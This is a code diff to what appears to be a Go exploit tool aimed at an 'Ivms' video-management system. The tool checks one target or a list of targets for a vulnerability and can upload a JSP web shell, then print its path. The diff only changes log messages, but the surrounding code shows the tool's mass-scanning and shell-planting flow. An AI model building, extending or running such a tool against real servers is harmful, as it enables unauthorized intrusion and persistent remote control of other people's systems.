@@ -26,21 +26,21 @@ func (I *Ivms) init() {
 	flag.Parse()
 	I.vuln = false
 	if I.target != "" && I.targetFile != "" {
-		log.Fatalln("just give single target with u parma or multi targets with parma f")
+		log.Fatalln("[*] just give single target with u parma or multi targets with parma f")
 	}
 	if I.targetFile != "" {
 		I.loadTargetsFile()
 	}
 	if I.upload {
 		if I.shellFile == "" {
-			log.Fatalln("pls specific a shell file if you want upload.")
+			log.Fatalln("[*] pls specific a shell file if you want upload.")
 		}
 	}
 }
 func (I *Ivms) loadTargetsFile() {
 	file, err := os.OpenFile(I.targetFile, os.O_RDONLY, 0666)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal("[*] file error")
 	}
 	defer file.Close()
 	scanner := bufio.NewScanner(file)
@@ -97,7 +97,8 @@ func (I *Ivms) uploadShell() {
 		if uuid := I.getUuid(resp.Body()); uuid != "" {
 			I.shellPath = I.target + fmt.Sprintf("/eps/upload/%s.jsp\n", uuid)
 		}
-
+	} else {
+		fmt.Printf("[-] target %s is secure\n", I.target)
 	}
 }
 func (I Ivms) getUuid(resp []byte) string {
@@ -111,14 +112,14 @@ func (I Ivms) getUuid(resp []byte) string {
 func (I *Ivms) Single() {
 	I.checkVul()
 	if I.vuln {
-		fmt.Printf("target %s is vuln\n", I.target)
+		fmt.Printf("[+] target %s may have vuln\n", I.target)
 	} else {
-		fmt.Printf("target %s is secure\n", I.target)
+		fmt.Printf("[-] target %s is secure\n", I.target)
 		return
 	}
 	if I.upload {
 		I.uploadShell()
-		fmt.Printf("shell path %s\n", I.shellPath)
+		fmt.Printf("[+] shell path %s\n", I.shellPath)
 	}
 }
 func (I *Ivms) Multi() {
@@ -126,13 +127,13 @@ func (I *Ivms) Multi() {
 		I.target = v
 		I.checkVul()
 		if I.vuln {
-			fmt.Printf("target %s may have vuln\n", I.target)
+			fmt.Printf("[+] target %s may have vuln\n", I.target)
 			if I.upload {
 				I.uploadShell()
-				fmt.Printf("shell path %s\n", I.shellPath)
+				fmt.Printf("[+] shell path %s\n", I.shellPath)
 			}
 		} else {
-			fmt.Printf("target %s is secure or have some problem\n", I.target)
+			fmt.Printf("[-] target %s is secure or have some problem\n", I.target)
 		}
 	}
 }
